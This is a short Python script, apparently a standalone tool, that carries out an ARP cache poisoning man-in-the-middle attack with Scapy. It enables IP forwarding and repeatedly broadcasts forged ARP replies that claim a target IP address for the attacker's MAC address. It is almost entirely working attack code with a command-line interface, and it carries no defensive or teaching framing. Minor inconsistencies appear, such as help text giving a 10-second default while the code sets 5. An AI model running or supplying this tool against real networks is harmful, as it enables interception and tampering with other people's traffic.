#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
	 ARP cache poisoning implementation using Scapy
"""

from scapy.all import *
from time import sleep
from os import geteuid
from sys import argv, exit
from argparse import ArgumentParser

IP_FORWARD = '/proc/sys/net/ipv4/ip_forward'

def arp_mitm(interface, target, interval=10.0):
	"""ARP cache poisoning attack"""

	myMAC = get_if_hwaddr(interface)
	while 1:
		sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=target, hwsrc=myMAC))
		sleep(interval)

if __name__ == "__main__":
	ap = ArgumentParser(description="ARP cache poisoning implementation using Scapy")
	ap.add_argument("-t", "--target", required=True, help="target's IP address")
	ap.add_argument("-i", "--interface", default="wlan0", help="network interface to use")
	ap.add_argument("-I", "--interval", type=float, default=5.0, help="seconds between two ARP frames (default: 10.0s)")
	args = vars(ap.parse_args())

	if not geteuid() == 0:
		exit("[!] You must be root")

	try:
		with open(IP_FORWARD, 'w') as fd:
        		fd.write('1')
		print("[*] Starting ARP MITM attack ...")
		arp_mitm(args["interface"], args["target"], args["interval"])
	except IOError:
		exit("[!] Interface doesn't exist")
	except KeyboardInterrupt:
		print("\n[*] Stopping ARP MITM attack")
		with open(IP_FORWARD, 'w') as fd:
        		fd.write('0')